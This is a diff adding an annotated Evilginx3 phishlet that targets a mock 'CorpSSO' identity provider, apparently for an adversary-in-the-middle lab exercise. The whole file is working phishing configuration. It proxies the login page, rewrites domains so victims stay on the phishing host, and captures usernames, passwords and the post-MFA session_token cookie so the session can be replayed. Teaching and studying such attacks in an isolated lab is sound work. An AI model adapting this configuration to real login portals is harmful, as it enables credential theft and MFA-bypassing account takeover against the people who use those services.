@@ -1,0 +1,124 @@
+# =============================================================================
+# CorpSSO Phishlet for Evilginx3
+# =============================================================================
+# This phishlet targets the CorpSSO mock identity provider used in the AitM
+# lab exercise. It is designed EXCLUSIVELY for use within the isolated lab
+# environment and will not work against any real-world service.
+#
+# The phishlet proxies the CorpSSO login page, captures username/password
+# credentials and the session_token cookie issued after successful MFA.
+# =============================================================================
+
+name: 'corpsso'
+author: 'UWECyber'
+min_ver: '3.0.0'
+
+# ---------------------------------------------------------------------------
+# proxy_hosts
+# ---------------------------------------------------------------------------
+# Defines the domain mapping between the legitimate CorpSSO server and the
+# phishing domain. Evilginx will proxy all traffic between these two.
+#
+# - phish_sub:   the subdomain used on the phishing domain
+# - orig_sub:    the subdomain on the legitimate target
+# - domain:      the legitimate target's root domain
+# - session:     true = this host carries the authentication session
+# - is_landing:  true = this is the page the victim lands on
+# ---------------------------------------------------------------------------
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'corpsso.local'
+    session: true
+    is_landing: true
+
+# ---------------------------------------------------------------------------
+# sub_filters
+# ---------------------------------------------------------------------------
+# String replacement rules applied to proxied responses. Every occurrence of
+# the legitimate domain in HTML, JavaScript, CSS, and other content types is
+# replaced with the phishing domain. Without these filters, the victim's
+# browser would be redirected to the real site when following internal links.
+# ---------------------------------------------------------------------------
+sub_filters:
+  - triggers_on: 'login.corpsso.local'
+    orig_sub: 'login'
+    domain: 'corpsso.local'
+    search: 'login.corpsso.local'
+    replace: '{hostname}'
+    mimes:
+      - 'text/html'
+      - 'application/javascript'
+      - 'text/css'
+      - 'application/json'
+      - 'text/plain'
+      - 'application/x-www-form-urlencoded'
+
+  # Also replace any absolute URLs that reference the domain without subdomain
+  - triggers_on: 'login.corpsso.local'
+    orig_sub: 'login'
+    domain: 'corpsso.local'
+    search: 'corpsso.local'
+    replace: '{domain}'
+    mimes:
+      - 'text/html'
+      - 'application/javascript'
+      - 'text/css'
+      - 'application/json'
+
+# ---------------------------------------------------------------------------
+# auth_tokens
+# ---------------------------------------------------------------------------
+# The cookies that Evilginx should capture from the victim's browser.
+# The session_token cookie is issued by CorpSSO after successful
+# authentication (including MFA). Capturing this cookie allows the
+# attacker to replay the authenticated session.
+# ---------------------------------------------------------------------------
+auth_tokens:
+  - domain: 'login.corpsso.local'
+    keys:
+      - 'session_token'
+
+# ---------------------------------------------------------------------------
+# credentials
+# ---------------------------------------------------------------------------
+# Defines which POST form fields contain credentials. Evilginx captures
+# these values from the login form submission.
+#
+# username.key / password.key: the HTML form field name to capture
+# username.search / password.search: regex to extract the value
+# type: 'post' means captured from HTTP POST form data
+# ---------------------------------------------------------------------------
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+# ---------------------------------------------------------------------------
+# auth_urls
+# ---------------------------------------------------------------------------
+# URL patterns that indicate successful authentication. When the victim's
+# browser is redirected to one of these URLs, Evilginx triggers the session
+# capture (recording the auth_tokens cookies).
+#
+# For CorpSSO, successful login (including MFA) redirects to /dashboard.
+# ---------------------------------------------------------------------------
+#auth_urls:
+#  - '/dashboard'
+
+# ---------------------------------------------------------------------------
+# login
+# ---------------------------------------------------------------------------
+# Defines the login page URL and form field names. This tells Evilginx
+# where the login form is located and what the input field names are.
+# ---------------------------------------------------------------------------
+login:
+  domain: 'login.corpsso.local'
+  path: '/login'
+  username: 'email'
+  password: 'password'
